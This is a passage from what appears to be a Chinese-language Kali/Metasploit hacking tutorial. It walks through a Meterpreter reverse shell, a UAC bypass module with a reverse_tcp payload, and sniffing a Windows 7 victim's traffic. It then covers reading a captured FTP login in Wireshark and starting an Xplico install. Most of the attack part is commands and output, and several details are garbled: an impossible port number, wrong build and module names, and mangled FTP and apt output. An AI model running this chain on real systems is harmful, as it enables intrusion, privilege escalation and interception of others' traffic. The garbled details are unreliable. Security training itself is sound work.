
[*] Started reverse TCP handler on 192.168.1.39:4444

[*] Sending stage (179779 bytes) to 192.168.1.93

[*] Meterpreter session 1 opened (192.168.1.39:4444) -> 192.168.1.93:526122

18-06-14 14:39:50 -0400

```
meterpreter >
```

使用 UAC 绕过模块运行 UAC，步骤所示：

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/windows/local/bypass_injection
msf exploit(windows/local/bypass_injection) > set session 1
session => 1
msf exploit(windows/local/bypass_injection) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(windows/local/bypass_injection) > set LHOST 192.168.1.39
LHOST => 192.168.1.39
msf exploit(windows/local/bypass_injection) > set LPORT 4544
LPORT => 4544
msf exploit(windows/local/bypass_injection) > exploit
[*] Started reverse TCP handler on 192.168.1.39:4544
[*] Windows 7 (Build 7608), may be vulnerable.
[*] UAC is enabled, checking level...
[*] Farm of Administrators group! Continuing...
[*] UAC is set to Default
[*] Bypass enabled by setting, continuing...
[*] Uploading the DLL to the filesystem.
[*] Successfully injected process with Windows Publisher Certificate, to inject into...
```

```
meterpreter >
```

我们处于禁用了 UAC 的 Session 2 中。现在我们需要获取系统级权限。我以前使用 `packetrecorder`，这是一个很有用的工具，但它已经被弃用了。它建议使用 `post/windows/manage/rcpcad_start`，但如果目标没有运行 wincap，这也不起作用。如前所述，在 Kali 中做任何事情都有多种方法，让我们使用 Metasploit Sniffer 吧。

### 使用 Metasploit Sniffer

2. 在 Meterpreter 提示符处输入 `use sniffer`。

3. 现在输入 `help`。你的 Meterpreter 命令中应该多了一个新选项：

| Command | Description |
|---|---|
| `sniffer_dump` | 将捕获的数据包数据检索到 PCAP 文件中 |
| `sniffer_interfaces` | 列出所有可嗅探的网络接口 |
| `sniffer_release` | 释放特定接口上已捕获的数据包 |
| `sniffer_start` | 在特定接口上开始捕获 |
| `sniffer_stats` | 查看活动捕获的统计信息 |
| `sniffer_stop` | 停止特定接口上的数据包捕获 |

4. 输入 `sniffer_interfaces` 查看目标上可用的网络接口列表：

我的 Windows 7 目标有两个接口（你的可能不同），一个 WAN Miniport 和一个 Intel NIC。我将使用 #2 号接口（Intel NIC）进行嗅探。

5. 要开始捕获数据包，输入 `sniffer_start 2`。

6. 现在，回到 Windows 7 目标系统并进行上网。你访问的每一个地方和发送的每一个网络包都将记录在 Kali 系统中。

7. 要保存你捕获的内容，输入 `sniffer_dump 2 /tmp/win7capture.cap`。

就是这样；所有数据将保存在 `/tmp/win7capture.cap` 文件中。

8. 完成后，输入 `sniffer_stop 2` 停止嗅探，输入 `sniffer_release 2` 丢弃额外的数据包。

## 使用 Wireshark 分析数据包

现在我们有了捕获的数据包，该如何处理呢？Wireshark 是一款强大的数据包捕获和分析程序，拥有大量功能。我们将使用这个工具快速查看我们的捕获的数据包。

1. 要启动 Wireshark，从 `Applications > 09 - Sniffing and Spoofing` 菜单中选择，或者直接从终端提示符运行它：

```
root@kali:-# wireshark &
```

2. 对于以超级用户运行的警告信息，点击 `OK`。

3. 点击 `File`，然后点击 `Open` 打开我们的数据包文件。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_189_0.png)

4. 点击 `Protocol` 按协议排序并向下滚动找到 FTP 部分：

| Protocol | Info |
|---|---|
| FTP | Response: 220 (vsFTPd 2.2.2) |
| FTP | Request: USER anonymous |
| FTP | Response: 331 Please specify the password. |
| FTP | Request: PASS mozilla@example.com |
| FTP | Response: 230 Login successful. |
| FTP | Request: SYST |
| FTP | Response: 215 UNIX Type: L8 |
| FTP | Request: PWD |
| FTP | Response: 257 "/" |
| FTP | Request: TYPE I |
| FTP | Response: 200 Switching to Binary mode. |
| FTP | Request: PASV |
| FTP | Response: 227 Entering Passive Mode (12,130,207,40,243,35) |

如果用户连接到任何未加密的 FTP 会话（如上面的示例），你将看到整个会话。要以明文查看会话，右键点击服务器 IP 并点击 `Follow TCP Stream`。你将看到如下所示流内容：

```
Stream Content:

220 (vsFtpd) 2.2.2)

230 anonymous

331 Please specify the password.

PASS mozilla@example.com

230 Login successful.

SYST

217 UNIX Type: h4

PWD

257 /

200 Switching to Binary mode.

PAS

227 Entering Passive Mode (12,130,207,40,235):

512 /Gateway/dir615_revC/Manual/dir615_revC_manual_300.pdf

226 12254902

MTM /Gateway/dir615_revC/Manual/dir615_revC_manual_300.pdf

226 12254902

RETR /Gateway/dir615_revC/Manual/dir615_revC_manual_300.pdf

150 Opening BINARY data connection for /Gateway/dir615_revC/Manual/dir615_revC_manual_300.pdf (12254902 bytes).

226 Transfer complete.
```

如上面的示例所示，我们有了一个完整的 FTP 登录和文件下载捕获。Wireshark 非常适合用于分析网络通信，你可以用它做很多事情，但对于新用户来说它有点复杂，可能很难熟悉。所以，让我们用最后一个程序查看我们的捕获数据包。Xplico 以易读的菜单列出了数据包获中的所有信息，它还允许我们查看任何图像或文档。

## Xplico

**工具作者：** Gianluca Costa, Andrea de Franceschi 及贡献者
**工具网站：** https://www.xplico.org/

Xplico 已添加到 Kali 存储库，但你的系统中可能尚未安装。它是一个基于 Web 的界面，因此要启动它，你需要 Apache Web Server 和 Xplico 服务。在 Kali 的 `System Services` 下，你应该能看到 Xplico。如果没有列出，则需要安装。运行以下命令进行安装：

```
apt install xplico
```

```
root@kali:~# apt install xplico
Reading package lists...
Building dependency tree...
The following packages were automatically installed
hn-python libbabeltrace-ctf libcbamell-crypt-openssl-sa-perl libcrypt-openssl-random-rsa-perllibledataserver-ui-file-copy-perl
```
